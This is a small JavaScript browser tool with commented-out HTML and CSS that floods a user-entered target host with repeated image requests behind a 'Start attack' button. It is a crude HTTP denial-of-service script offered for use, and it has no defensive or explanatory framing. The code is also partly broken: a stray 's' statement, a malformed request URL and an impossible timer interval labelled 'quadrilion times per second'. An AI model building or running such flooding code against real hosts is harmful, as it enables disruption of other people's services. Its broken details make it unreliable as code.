function flood() {
  var target = document.querySelector("#inp").value;
  var uri = "/index.html";
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = "http://" + target + uri + rand + " = val"
  document.querySelector("p").innerHTML += target + uri + rand + "<br>"

}

function start() {
  //quadrilion times per second
  var i = setInterval(flood, 0.000000000000001);
  i;
  s
}














/*


<h1>Refresh window to stop the attack</h1>

<div id="flex">
  <input type="text" id="inp" placeholder="Enter target here">
<button onclick="start()">Start attack</button>
  
</input>

</div>
<p></p>


*/

/*


button{
background: #e74c3c;
color: white;
border: none;
 padding: 40px;
}

#flex{
display: flex;
justify-content: center;
  
}

h1,p{
text-align: center;
}



*/
